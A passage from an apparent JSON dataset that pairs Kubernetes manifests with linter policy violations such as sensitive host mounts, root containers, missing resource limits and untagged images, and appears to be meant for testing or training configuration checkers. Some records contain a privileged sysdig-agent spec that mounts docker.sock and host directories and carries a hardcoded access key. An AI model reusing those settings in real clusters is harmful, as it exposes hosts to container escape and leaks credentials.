    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: sysdig-agent\n  labels:\n    app: sysdig-agent\nspec:\n  replicas: 100\n  template:\n    spec:\n      volumes:\n      - name: docker-sock\n        hostPath:\n          path: /var/run/docker.sock\n      - name: dev-vol\n        hostPath:\n          path: /dev\n      - name: proc-vol\n        hostPath:\n          path: /proc\n      - name: boot-vol\n        hostPath:\n          path: /boot\n      - name: modules-vol\n        hostPath:\n          path: /lib/modules\n      - name: usr-vol\n        hostPath:\n          path: /usr\n      containers:\n      - name: sysdig-agent\n        image: sysdig/agent\n        ports:\n        - containerPort: 6666\n          hostPort: 6666\n        securityContext:\n          privileged: true\n        env:\n        - name: ACCESS_KEY\n          value: 8312341g-5678-abcd-4a2b2c-33bcsd655\n        volumeMounts:\n        - mountPath: /host/var/run/docker.sock\n          name: docker-sock\n          readOnly: false\n        - mountPath: /host/dev\n          name: dev-vol\n          readOnly: false\n        - mountPath: /host/proc\n          name: proc-vol\n          readOnly: true\n        - mountPath: /host/boot\n          name: boot-vol\n          readOnly: true\n        - mountPath: /host/lib/modules\n          name: modules-vol\n          readOnly: true\n        - mountPath: /host/usr\n          name: usr-vol\n          readOnly: true\n",
    "policy_id": "sensitive-host-mounts",
    "violation_text": "host system directory \"/proc\" is mounted on container \"sysdig-agent\""
  },
  {
    "id": "6904",
    "manifest_path": "data/manifests/the_stack_sample/sample_2512.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: sysdig-agent\n  labels:\n    app: sysdig-agent\nspec:\n  replicas: 100\n  template:\n    spec:\n      volumes:\n      - name: docker-sock\n        hostPath:\n          path: /var/run/docker.sock\n      - name: dev-vol\n        hostPath:\n          path: /dev\n      - name: proc-vol\n        hostPath:\n          path: /proc\n      - name: boot-vol\n        hostPath:\n          path: /boot\n      - name: modules-vol\n        hostPath:\n          path: /lib/modules\n      - name: usr-vol\n        hostPath:\n          path: /usr\n      containers:\n      - name: sysdig-agent\n        image: sysdig/agent\n        ports:\n        - containerPort: 6666\n          hostPort: 6666\n        securityContext:\n          privileged: true\n        env:\n        - name: ACCESS_KEY\n          value: 8312341g-5678-abcd-4a2b2c-33bcsd655\n        volumeMounts:\n        - mountPath: /host/var/run/docker.sock\n          name: docker-sock\n          readOnly: false\n        - mountPath: /host/dev\n          name: dev-vol\n          readOnly: false\n        - mountPath: /host/proc\n          name: proc-vol\n          readOnly: true\n        - mountPath: /host/boot\n          name: boot-vol\n          readOnly: true\n        - mountPath: /host/lib/modules\n          name: modules-vol\n          readOnly: true\n        - mountPath: /host/usr\n          name: usr-vol\n          readOnly: true\n",
    "policy_id": "sensitive-host-mounts",
    "violation_text": "host system directory \"/usr\" is mounted on container \"sysdig-agent\""
  },
  {
    "id": "6905",
    "manifest_path": "data/manifests/the_stack_sample/sample_2512.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: sysdig-agent\n  labels:\n    app: sysdig-agent\nspec:\n  replicas: 100\n  template:\n    spec:\n      volumes:\n      - name: docker-sock\n        hostPath:\n          path: /var/run/docker.sock\n      - name: dev-vol\n        hostPath:\n          path: /dev\n      - name: proc-vol\n        hostPath:\n          path: /proc\n      - name: boot-vol\n        hostPath:\n          path: /boot\n      - name: modules-vol\n        hostPath:\n          path: /lib/modules\n      - name: usr-vol\n        hostPath:\n          path: /usr\n      containers:\n      - name: sysdig-agent\n        image: sysdig/agent\n        ports:\n        - containerPort: 6666\n          hostPort: 6666\n        securityContext:\n          privileged: true\n        env:\n        - name: ACCESS_KEY\n          value: 8312341g-5678-abcd-4a2b2c-33bcsd655\n        volumeMounts:\n        - mountPath: /host/var/run/docker.sock\n          name: docker-sock\n          readOnly: false\n        - mountPath: /host/dev\n          name: dev-vol\n          readOnly: false\n        - mountPath: /host/proc\n          name: proc-vol\n          readOnly: true\n        - mountPath: /host/boot\n          name: boot-vol\n          readOnly: true\n        - mountPath: /host/lib/modules\n          name: modules-vol\n          readOnly: true\n        - mountPath: /host/usr\n          name: usr-vol\n          readOnly: true\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"sysdig-agent\" has cpu request 0"
  },
  {
    "id": "6906",
    "manifest_path": "data/manifests/the_stack_sample/sample_2512.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: sysdig-agent\n  labels:\n    app: sysdig-agent\nspec:\n  replicas: 100\n  template:\n    spec:\n      volumes:\n      - name: docker-sock\n        hostPath:\n          path: /var/run/docker.sock\n      - name: dev-vol\n        hostPath:\n          path: /dev\n      - name: proc-vol\n        hostPath:\n          path: /proc\n      - name: boot-vol\n        hostPath:\n          path: /boot\n      - name: modules-vol\n        hostPath:\n          path: /lib/modules\n      - name: usr-vol\n        hostPath:\n          path: /usr\n      containers:\n      - name: sysdig-agent\n        image: sysdig/agent\n        ports:\n        - containerPort: 6666\n          hostPort: 6666\n        securityContext:\n          privileged: true\n        env:\n        - name: ACCESS_KEY\n          value: 8312341g-5678-abcd-4a2b2c-33bcsd655\n        volumeMounts:\n        - mountPath: /host/var/run/docker.sock\n          name: docker-sock\n          readOnly: false\n        - mountPath: /host/dev\n          name: dev-vol\n          readOnly: false\n        - mountPath: /host/proc\n          name: proc-vol\n          readOnly: true\n        - mountPath: /host/boot\n          name: boot-vol\n          readOnly: true\n        - mountPath: /host/lib/modules\n          name: modules-vol\n          readOnly: true\n        - mountPath: /host/usr\n          name: usr-vol\n          readOnly: true\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"sysdig-agent\" has memory limit 0"
  },
  {
    "id": "6907",
    "manifest_path": "data/manifests/the_stack_sample/sample_2513.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: efs-writer\n  namespace: storage\nspec:\n  containers:\n  - name: efs-writer\n    image: busybox\n    command:\n    - /bin/sh\n    args:\n    - -c\n    - while true; do echo $POD_NAME.$POD_NAMESPACE - $(date -u) >> /shared/out.txt;\n      sleep 5; done\n    env:\n    - name: POD_NAME\n      valueFrom:\n        fieldRef:\n          fieldPath: metadata.name\n    - name: POD_NAMESPACE\n      valueFrom:\n        fieldRef:\n          fieldPath: metadata.namespace\n    volumeMounts:\n    - name: efs-pvc\n      mountPath: /shared\n  volumes:\n  - name: efs-pvc\n    persistentVolumeClaim:\n      claimName: efs-storage-claim\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"efs-writer\" is using an invalid container image, \"busybox\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "6908",
    "manifest_path": "data/manifests/the_stack_sample/sample_2513.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: efs-writer\n  namespace: storage\nspec:\n  containers:\n  - name: efs-writer\n    image: busybox\n    command:\n    - /bin/sh\n    args:\n    - -c\n    - while true; do echo $POD_NAME.$POD_NAMESPACE - $(date -u) >> /shared/out.txt;\n      sleep 5; done\n    env:\n    - name: POD_NAME\n      valueFrom:\n        fieldRef:\n          fieldPath: metadata.name\n    - name: POD_NAMESPACE\n      valueFrom:\n        fieldRef:\n          fieldPath: metadata.namespace\n    volumeMounts:\n    - name: efs-pvc\n      mountPath: /shared\n  volumes:\n  - name: efs-pvc\n    persistentVolumeClaim:\n      claimName: efs-storage-claim\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"efs-writer\" does not have a read-only root file system"
  },
  {
    "id": "6909",
    "manifest_path": "data/manifests/the_stack_sample/sample_2513.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: efs-writer\n  namespace: storage\nspec:\n  containers:\n  - name: efs-writer\n    image: busybox\n    command:\n    - /bin/sh\n    args:\n    - -c\n    - while true; do echo $POD_NAME.$POD_NAMESPACE - $(date -u) >> /shared/out.txt;\n      sleep 5; done\n    env:\n    - name: POD_NAME\n      valueFrom:\n        fieldRef:\n          fieldPath: metadata.name\n    - name: POD_NAMESPACE\n      valueFrom:\n        fieldRef:\n          fieldPath: metadata.namespace\n    volumeMounts:\n    - name: efs-pvc\n      mountPath: /shared\n  volumes:\n  - name: efs-pvc\n    persistentVolumeClaim:\n      claimName: efs-storage-claim\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"efs-writer\" is not set to runAsNonRoot"
  },
  {
    "id": "6910",
    "manifest_path": "data/manifests/the_stack_sample/sample_2513.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: efs-writer\n  namespace: storage\nspec:\n  containers:\n  - name: efs-writer\n    image: busybox\n    command:\n    - /bin/sh\n    args:\n    - -c\n    - while true; do echo $POD_NAME.$POD_NAMESPACE - $(date -u) >> /shared/out.txt;\n      sleep 5; done\n    env:\n    - name: POD_NAME\n      valueFrom:\n        fieldRef:\n          fieldPath: metadata.name\n    - name: POD_NAMESPACE\n      valueFrom:\n        fieldRef:\n          fieldPath: metadata.namespace\n    volumeMounts:\n    - name: efs-pvc\n      mountPath: /shared\n  volumes:\n  - name: efs-pvc\n    persistentVolumeClaim:\n      claimName: efs-storage-claim\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"efs-writer\" has cpu request 0"
  },
  {
    "id": "6911",
    "manifest_path": "data/manifests/the_stack_sample/sample_2513.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: efs-writer\n  namespace: storage\nspec:\n  containers:\n  - name: efs-writer\n    image: busybox\n    command:\n    - /bin/sh\n    args:\n    - -c\n    - while true; do echo $POD_NAME.$POD_NAMESPACE - $(date -u) >> /shared/out.txt;\n      sleep 5; done\n    env:\n    - name: POD_NAME\n      valueFrom:\n        fieldRef:\n          fieldPath: metadata.name\n    - name: POD_NAMESPACE\n      valueFrom:\n        fieldRef:\n          fieldPath: metadata.namespace\n    volumeMounts:\n    - name: efs-pvc\n      mountPath: /shared\n  volumes:\n  - name: efs-pvc\n    persistentVolumeClaim:\n      claimName: efs-storage-claim\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"efs-writer\" has memory limit 0"
  },
  {
    "id": "6912",
    "manifest_path": "data/manifests/the_stack_sample/sample_2514.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: auth-pod\n  labels:\n    app: auth\nspec:\n  containers:\n  - name: auth\n    image: cesanta/docker_auth:1\n    ports:\n    - containerPort: 5001\n    args:\n    - --v=2\n    - --alsologtostderr\n    - /config/auth_config.yml\n    volumeMounts:\n    - name: auth-ssl-volume\n      mountPath: /ssl\n      readOnly: true\n    - name: auth-config-volume\n      mountPath: /config\n      readOnly: true\n  volumes:\n  - name: auth-ssl-volume\n    secret:\n      secretName: auth-ssl-server\n  - name: auth-config-volume\n    secret:\n      secretName: auth-config-secret\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"auth\" does not have a read-only root file system"
  },
  {
    "id": "6913",
    "manifest_path": "data/manifests/the_stack_sample/sample_2514.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: auth-pod\n  labels:\n    app: auth\nspec:\n  containers:\n  - name: auth\n    image: cesanta/docker_auth:1\n    ports:\n    - containerPort: 5001\n    args:\n    - --v=2\n    - --alsologtostderr\n    - /config/auth_config.yml\n    volumeMounts:\n    - name: auth-ssl-volume\n      mountPath: /ssl\n      readOnly: true\n    - name: auth-config-volume\n      mountPath: /config\n      readOnly: true\n  volumes:\n  - name: auth-ssl-volume\n    secret:\n      secretName: auth-ssl-server\n  - name: auth-config-volume\n    secret:\n      secretName: auth-config-secret\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"auth\" is not set to runAsNonRoot"
  },
  {
    "id": "6914",
    "manifest_path": "data/manifests/the_stack_sample/sample_2514.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: auth-pod\n  labels:\n    app: auth\nspec:\n  containers:\n  - name: auth\n    image: cesanta/docker_auth:1\n    ports:\n    - containerPort: 5001\n    args:\n    - --v=2\n    - --alsologtostderr\n    - /config/auth_config.yml\n    volumeMounts:\n    - name: auth-ssl-volume\n      mountPath: /ssl\n      readOnly: true\n    - name: auth-config-volume\n      mountPath: /config\n      readOnly: true\n  volumes:\n  - name: auth-ssl-volume\n    secret:\n      secretName: auth-ssl-server\n  - name: auth-config-volume\n    secret:\n      secretName: auth-config-secret\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"auth\" has cpu request 0"
  },
  {
    "id": "6915",
    "manifest_path": "data/manifests/the_stack_sample/sample_2514.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: auth-pod\n  labels:\n    app: auth\nspec:\n  containers:\n  - name: auth\n    image: cesanta/docker_auth:1\n    ports:\n    - containerPort: 5001\n    args:\n    - --v=2\n    - --alsologtostderr\n    - /config/auth_config.yml\n    volumeMounts:\n    - name: auth-ssl-volume\n      mountPath: /ssl\n      readOnly: true\n    - name: auth-config-volume\n      mountPath: /config\n      readOnly: true\n  volumes:\n  - name: auth-ssl-volume\n    secret:\n      secretName: auth-ssl-server\n  - name: auth-config-volume\n    secret:\n      secretName: auth-config-secret\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"auth\" has memory limit 0"
  },
  {
    "id": "6916",
    "manifest_path": "data/manifests/the_stack_sample/sample_2516.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: celery-beat\n  labels:\n    deployment: celery-beat\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      pod: celery-beat\n  template:\n    metadata:\n      labels:\n        pod: celery-beat\n    spec:\n      containers:\n      - name: celery-beat\n        image: willwcchan/visual-option-chain-graph\n        command:\n        - celery\n        - -A\n        - visual-option-chain\n        - beat\n        - -l\n        - debug\n        env:\n        - name: POSTGRES_USER\n          valueFrom:\n            secretKeyRef:\n              name: postgres-credentials\n              key: user\n        - name: POSTGRES_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: postgres-credentials\n              key: password\n        - name: POSTGRES_HOST\n          value: postgres-service\n        - name: SECRET_KEY\n          valueFrom:\n            secretKeyRef:\n              name: app-secret\n              key: SECRET_KEY\n        - name: TRADIER_API_KEY\n          valueFrom:\n            secretKeyRef:\n              name: app-secret\n              key: TRADIER_API_KEY\n        - name: EMAIL_HOST_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: app-secret\n              key: EMAIL_HOST_PASSWORD\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"celery-beat\" is using an invalid container image, \"willwcchan/visual-option-chain-graph\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "6917",
    "manifest_path": "data/manifests/the_stack_sample/sample_2516.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: celery-beat\n  labels:\n    deployment: celery-beat\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      pod: celery-beat\n  template:\n    metadata:\n      labels:\n        pod: celery-beat\n    spec:\n      containers:\n      - name: celery-beat\n        image: willwcchan/visual-option-chain-graph\n        command:\n        - celery\n        - -A\n        - visual-option-chain\n        - beat\n        - -l\n        - debug\n        env:\n        - name: POSTGRES_USER\n          valueFrom:\n            secretKeyRef:\n              name: postgres-credentials\n              key: user\n        - name: POSTGRES_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: postgres-credentials\n              key: password\n        - name: POSTGRES_HOST\n          value: postgres-service\n        - name: SECRET_KEY\n          valueFrom:\n            secretKeyRef:\n              name: app-secret\n              key: SECRET_KEY\n        - name: TRADIER_API_KEY\n          valueFrom:\n            secretKeyRef:\n              name: app-secret\n              key: TRADIER_API_KEY\n        - name: EMAIL_HOST_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: app-secret\n              key: EMAIL_HOST_PASSWORD\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"celery-beat\" does not have a read-only root file system"
  },
  {
    "id": "6918",
    "manifest_path": "data/manifests/the_stack_sample/sample_2516.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: celery-beat\n  labels:\n    deployment: celery-beat\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      pod: celery-beat\n  template:\n    metadata:\n      labels:\n        pod: celery-beat\n    spec:\n      containers:\n      - name: celery-beat\n        image: willwcchan/visual-option-chain-graph\n        command:\n        - celery\n        - -A\n        - visual-option-chain\n        - beat\n        - -l\n        - debug\n        env:\n        - name: POSTGRES_USER\n          valueFrom:\n            secretKeyRef:\n              name: postgres-credentials\n              key: user\n        - name: POSTGRES_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: postgres-credentials\n              key: password\n        - name: POSTGRES_HOST\n          value: postgres-service\n        - name: SECRET_KEY\n          valueFrom:\n            secretKeyRef:\n              name: app-secret\n              key: SECRET_KEY\n        - name: TRADIER_API_KEY\n          valueFrom:\n            secretKeyRef:\n              name: app-secret\n              key: TRADIER_API_KEY\n        - name: EMAIL_HOST_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: app-secret\n              key: EMAIL_HOST_PASSWORD\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"celery-beat\" is not set to runAsNonRoot"
  },
  {
    "id": "6919",
    "manifest_path": "data/manifests/the_stack_sample/sample_2516.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: celery-beat\n  labels:\n    deployment: celery-beat\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      pod: celery-beat\n  template:\n    metadata:\n      labels:\n        pod: celery-beat\n    spec:\n      containers:\n      - name: celery-beat\n        image: willwcchan/visual-option-chain-graph\n        command:\n        - celery\n        - -A\n        - visual-option-chain\n        - beat\n        - -l\n        - debug\n        env:\n        - name: POSTGRES_USER\n          valueFrom:\n            secretKeyRef:\n              name: postgres-credentials\n              key: user\n        - name: POSTGRES_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: postgres-credentials\n              key: password\n        - name: POSTGRES_HOST\n          value: postgres-service\n        - name: SECRET_KEY\n          valueFrom:\n            secretKeyRef:\n              name: app-secret\n              key: SECRET_KEY\n        - name: TRADIER_API_KEY\n          valueFrom:\n            secretKeyRef:\n              name: app-secret\n              key: TRADIER_API_KEY\n        - name: EMAIL_HOST_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: app-secret\n              key: EMAIL_HOST_PASSWORD\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"celery-beat\" has cpu request 0"
  },
  {
    "id": "6920",
    "manifest_path": "data/manifests/the_stack_sample/sample_2516.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: celery-beat\n  labels:\n    deployment: celery-beat\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      pod: celery-beat\n  template:\n    metadata:\n      labels:\n        pod: celery-beat\n    spec:\n      containers:\n      - name: celery-beat\n        image: willwcchan/visual-option-chain-graph\n        command:\n        - celery\n        - -A\n        - visual-option-chain\n        - beat\n        - -l\n        - debug\n        env:\n        - name: POSTGRES_USER\n          valueFrom:\n            secretKeyRef:\n              name: postgres-credentials\n              key: user\n        - name: POSTGRES_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: postgres-credentials\n              key: password\n        - name: POSTGRES_HOST\n          value: postgres-service\n        - name: SECRET_KEY\n          valueFrom:\n            secretKeyRef:\n              name: app-secret\n              key: SECRET_KEY\n        - name: TRADIER_API_KEY\n          valueFrom:\n            secretKeyRef:\n              name: app-secret\n              key: TRADIER_API_KEY\n        - name: EMAIL_HOST_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: app-secret\n              key: EMAIL_HOST_PASSWORD\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"celery-beat\" has memory limit 0"
  },
  {
    "id": "6921",
    "manifest_path": "data/manifests/the_stack_sample/sample_2517.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: crapi-web\n  labels:\n    app: crapi-web\nspec:\n  ports:\n  - port: 80\n    nodePort: 30080\n    name: nginx\n  type: LoadBalancer\n  selector:\n    app: crapi-web\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:crapi-web])"
  },
  {
    "id": "6922",
    "manifest_path": "data/manifests/the_stack_sample/sample_2521.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  annotations:\n    openshift.io/generated-by: OpenShiftNewApp\n  labels:\n    app: result\n  name: result\n  namespace: voting-application\nspec:\n  clusterIP: 172.30.241.130\n  ports:\n  - name: 80-tcp\n    port: 80\n    protocol: TCP\n    targetPort: 8080\n  selector:\n    app: result\n    deploymentconfig: result\n  sessionAffinity: None\n  type: ClusterIP\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:result deploymentconfig:result])"
  },
  {
    "id": "6923",
    "manifest_path": "data/manifests/the_stack_sample/sample_2523.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: vpa-updater\n  namespace: kube-system\n  labels:\n    application: vertical-pod-autoscaler\n    component: updater\n    version: v0.6.1-internal.10\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      application: vertical-pod-autoscaler\n      component: updater\n  template:\n    metadata:\n      labels:\n        application: vertical-pod-autoscaler\n        component: updater\n        version: v0.6.1-internal.10\n    spec:\n      serviceAccountName: vpa-updater\n      containers:\n      - name: updater\n        image: registry.opensource.zalan.do/teapot/vpa-updater:v0.6.1-internal.10\n        command:\n        - ./updater\n        args:\n        - --v=4\n        - --stderrthreshold=info\n        - --min-replicas=1\n        - --pod-lifetime-update-threshold=12h\n        - --evict-after-oom-threshold=12h\n        resources:\n          limits:\n            cpu: 200m\n            memory: 500Mi\n          requests:\n            cpu: 200m\n            memory: 500Mi\n        ports:\n        - containerPort: 8080\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"updater\" does not have a read-only root file system"
  },
  {
    "id": "6924",
    "manifest_path": "data/manifests/the_stack_sample/sample_2523.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: vpa-updater\n  namespace: kube-system\n  labels:\n    application: vertical-pod-autoscaler\n    component: updater\n    version: v0.6.1-internal.10\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      application: vertical-pod-autoscaler\n      component: updater\n  template:\n    metadata:\n      labels:\n        application: vertical-pod-autoscaler\n        component: updater\n        version: v0.6.1-internal.10\n    spec:\n      serviceAccountName: vpa-updater\n      containers:\n      - name: updater\n        image: registry.opensource.zalan.do/teapot/vpa-updater:v0.6.1-internal.10\n        command:\n        - ./updater\n        args:\n        - --v=4\n        - --stderrthreshold=info\n        - --min-replicas=1\n        - --pod-lifetime-update-threshold=12h\n        - --evict-after-oom-threshold=12h\n        resources:\n          limits:\n            cpu: 200m\n            memory: 500Mi\n          requests:\n            cpu: 200m\n            memory: 500Mi\n        ports:\n        - containerPort: 8080\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"vpa-updater\" not found"
  },
  {
    "id": "6925",
    "manifest_path": "data/manifests/the_stack_sample/sample_2523.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: vpa-updater\n  namespace: kube-system\n  labels:\n    application: vertical-pod-autoscaler\n    component: updater\n    version: v0.6.1-internal.10\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      application: vertical-pod-autoscaler\n      component: updater\n  template:\n    metadata:\n      labels:\n        application: vertical-pod-autoscaler\n        component: updater\n        version: v0.6.1-internal.10\n    spec:\n      serviceAccountName: vpa-updater\n      containers:\n      - name: updater\n        image: registry.opensource.zalan.do/teapot/vpa-updater:v0.6.1-internal.10\n        command:\n        - ./updater\n        args:\n        - --v=4\n        - --stderrthreshold=info\n        - --min-replicas=1\n        - --pod-lifetime-update-threshold=12h\n        - --evict-after-oom-threshold=12h\n        resources:\n          limits:\n            cpu: 200m\n            memory: 500Mi\n          requests:\n            cpu: 200m\n            memory: 500Mi\n        ports:\n        - containerPort: 8080\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"updater\" is not set to runAsNonRoot"
  },
  {
    "id": "6926",
    "manifest_path": "data/manifests/the_stack_sample/sample_2524.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: ashutoshazurepipelinesimagegeneration\nspec:\n  type: LoadBalancer\n  ports:\n  - port: 80\n  selector:\n    app: ashutoshazurepipelinesimagegeneration\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:ashutoshazurepipelinesimagegeneration])"
  },
  {
    "id": "6927",
    "manifest_path": "data/manifests/the_stack_sample/sample_2527.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: sinker\n  labels:\n    app: sinker\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: sinker\n  template:\n    metadata:\n      labels:\n        app: sinker\n    spec:\n      containers:\n      - name: sinker\n        args:\n        - --build-cluster=/etc/cluster/cluster\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --dry-run=false\n        image: gcr.io/k8s-prow/sinker:v20200124-7f273dc1b\n        volumeMounts:\n        - mountPath: /etc/cluster\n          name: cluster\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: cluster\n        secret:\n          defaultMode: 420\n          secretName: build-cluster\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"sinker\" does not have a read-only root file system"
  },
  {
    "id": "6928",
    "manifest_path": "data/manifests/the_stack_sample/sample_2527.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: sinker\n  labels:\n    app: sinker\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: sinker\n  template:\n    metadata:\n      labels:\n        app: sinker\n    spec:\n      containers:\n      - name: sinker\n        args:\n        - --build-cluster=/etc/cluster/cluster\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --dry-run=false\n        image: gcr.io/k8s-prow/sinker:v20200124-7f273dc1b\n        volumeMounts:\n        - mountPath: /etc/cluster\n          name: cluster\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: cluster\n        secret:\n          defaultMode: 420\n          secretName: build-cluster\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"sinker\" is not set to runAsNonRoot"
  },
  {
    "id": "6929",
    "manifest_path": "data/manifests/the_stack_sample/sample_2527.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: sinker\n  labels:\n    app: sinker\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: sinker\n  template:\n    metadata:\n      labels:\n        app: sinker\n    spec:\n      containers:\n      - name: sinker\n        args:\n        - --build-cluster=/etc/cluster/cluster\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --dry-run=false\n        image: gcr.io/k8s-prow/sinker:v20200124-7f273dc1b\n        volumeMounts:\n        - mountPath: /etc/cluster\n          name: cluster\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: cluster\n        secret:\n          defaultMode: 420\n          secretName: build-cluster\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"sinker\" has cpu request 0"
  },
  {
    "id": "6930",
    "manifest_path": "data/manifests/the_stack_sample/sample_2527.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: sinker\n  labels:\n    app: sinker\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: sinker\n  template:\n    metadata:\n      labels:\n        app: sinker\n    spec:\n      containers:\n      - name: sinker\n        args:\n        - --build-cluster=/etc/cluster/cluster\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        - --dry-run=false\n        image: gcr.io/k8s-prow/sinker:v20200124-7f273dc1b\n        volumeMounts:\n        - mountPath: /etc/cluster\n          name: cluster\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: cluster\n        secret:\n          defaultMode: 420\n          secretName: build-cluster\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"sinker\" has memory limit 0"
  },
  {
    "id": "6931",
    "manifest_path": "data/manifests/the_stack_sample/sample_2528.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  annotations:\n    fluxcd.io/automated: 'true'\n  name: podinfo\n  namespace: demo-prod\n",
    "policy_id": "mismatching-selector",
    "violation_text": "object has no selector specified"
  },
  {
    "id": "6932",
    "manifest_path": "data/manifests/the_stack_sample/sample_2529.yaml",
